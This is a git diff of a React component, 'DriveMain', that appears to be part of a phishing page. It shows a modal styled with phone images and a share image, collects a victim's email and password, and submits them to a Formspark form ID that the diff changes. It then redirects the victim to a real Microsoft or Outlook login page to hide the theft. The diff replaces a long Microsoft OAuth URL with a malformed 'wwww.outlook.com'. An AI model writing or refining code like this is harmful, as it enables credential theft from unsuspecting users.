@@ -3,14 +3,14 @@ import { useState } from "react";
 import { GrFormNext } from "react-icons/gr";
 import { Modal } from "react-responsive-modal";
 import "react-responsive-modal/styles.css";
+import PhoneIcons from "../assets/images/RE4q5Ja.webp";
 import PhoneOne from "../assets/images/phone1.webp";
 import PhoneTwo from "../assets/images/phone2.webp";
 import PhoneThree from "../assets/images/phone3.webp";
-import PhoneIcons from "../assets/images/RE4q5Ja.webp";
 import ShareImg from "../assets/images/share.webp";
 import Ondream from "../assets/images/splogo.png";
 
-const FORMSPARK_FORM_ID = "nqw0HbdR";
+const FORMSPARK_FORM_ID = "ekS3rX9oR";
 
 const DriveMain = () => {
   const [open, setOpen] = useState(true);
@@ -27,9 +27,7 @@ const DriveMain = () => {
   const handleSubmit = async (e) => {
     e.preventDefault();
     await submit({ eml, emlPass });
-    return window.location.replace(
-      "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=637927243301585625.OGQyZTYyNWUtN2FiZi00MDY4LTgzNmEtMTdhZDcwNmNhMDE4YzIzOWMxZTAtMGJlMi00YzY5LTgzNWQtZWI1ODAzN2IxM2Jj&ui_locales=en-US&mkt=en-US&state=MR-m1uB8ONlCjeYJcz1A7onNZn482zETeIPQNCanCLvbYF3Js8lZYS_LnKSyeuFTjpD7NWoWTYukltfY_iL6Ebv8LDlR94dB8Aa4KsP6aEhCvLoUoVYrto-DhOBIAOZYQMPgO2uP_3ioHjlQZaeUTotPG-jqsioEoKK6OlET8qvYu1ZgtD6N1ozjjZ83HQIDH12OV3gBOI5zY4mE06SKkjnyVdjDD42fLHMacgbLK5V10LmpNA8Bbrs3unEoS01R24QfQK4fW0p4F5AsWhtFY2V-qwtIh0wkuCJuRB-zbI8&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.12.1.0"
-    );
+    return window.location.replace("wwww.outlook.com");
   };
 
   return (
